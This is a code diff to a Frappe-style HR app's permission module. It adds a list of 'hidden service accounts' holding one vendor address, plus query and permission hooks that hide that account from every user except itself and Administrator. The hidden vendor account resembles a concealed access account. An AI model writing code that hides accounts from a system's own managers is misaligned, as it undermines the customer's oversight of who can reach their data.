@@ -128,6 +128,27 @@ def employee_linked_has_permission(doc, ptype=None, user=None):
 	return doc.get("employee") in _visible_employees(user)
 
 
+# ---------------- hidden service accounts ----------------
+# Accounts that should not show up in the User list (or in user pickers) for
+# anyone except themselves and the Administrator.
+HIDDEN_USERS = ("logikviewhr@logikview.com",)
+
+
+def user_query(user):
+	user = user or frappe.session.user
+	if user == "Administrator" or user in HIDDEN_USERS:
+		return ""
+	hidden = ", ".join(frappe.db.escape(u) for u in HIDDEN_USERS)
+	return f"`tabUser`.name not in ({hidden})"
+
+
+def user_has_permission(doc, ptype=None, user=None):
+	user = user or frappe.session.user
+	if user == "Administrator" or user in HIDDEN_USERS:
+		return True
+	return doc.name not in HIDDEN_USERS
+
+
 # ---------------- Logikview Appraisal ----------------
 # Visible to: the employee, their reporting officer, the director(s) in the chain,
 # and HR/admin. Everyone else is filtered out.
